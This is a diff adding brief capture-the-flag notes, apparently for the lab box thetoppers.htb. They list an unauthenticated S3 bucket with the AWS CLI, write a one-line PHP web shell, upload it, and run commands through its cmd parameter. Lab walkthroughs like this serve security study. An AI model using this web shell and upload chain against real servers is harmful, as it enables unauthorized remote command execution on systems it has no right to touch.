@@ -1,0 +1,21 @@
+### configure
+aws configure     # type: temp on all
+
+### list all of the S3 buckets hosted by the server by using the ls command.
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+
+### use the ls  command to list objects and common prefixes under the specified bucket.
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+### can use the following PHP one-liner which uses the system()  function which takes the URL parameter cmd  as an input and executes it as a system command.
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+### upload this PHP shell to the thetoppers.htb  S3 bucket using the following command.
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+
+# ls if the shell is uploaded
+aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
+
+### confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Try executing the OS command id  using the URL parameter cmd .
+http://thetoppers.htb/shell.php?cmd=id
+
